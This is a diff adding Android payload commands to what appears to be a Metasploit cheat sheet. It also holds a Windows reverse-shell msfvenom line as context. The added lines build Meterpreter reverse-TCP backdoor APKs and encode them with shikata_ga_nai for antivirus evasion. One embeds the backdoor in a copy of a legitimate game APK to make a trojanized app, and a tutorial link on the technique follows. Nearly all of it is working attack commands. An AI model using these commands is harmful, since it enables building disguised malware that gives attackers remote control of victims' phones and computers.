@@ -102,7 +102,17 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.47.29 LPORT=4444 -f powersh
 ```
 
 
+# ANDROID PAYLOADS
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=4444 -o /root/Desktop/backdoor.apk
 
+## Add encoding for Evasion
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=4444 -e x86/shikata_ga_nai -i 3 -o /root/Desktop/encoded_backdoor.apk
 
+msfvenom --list encoders
+msfvenom --list payloads | grep android
 
+# Embed payload into original apk
 
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.43.1 LPORT=4444 -x fruit_ninja.apk -e x86/shikata_ga_nai -i 3 -o /home/cyberxploit/Desktop/projects/fruit_ninjaa.apk
+
+https://medium.com/@elijahchimera01/embedding-metasploit-payloads-into-legit-android-apps-ad75ab6199c6
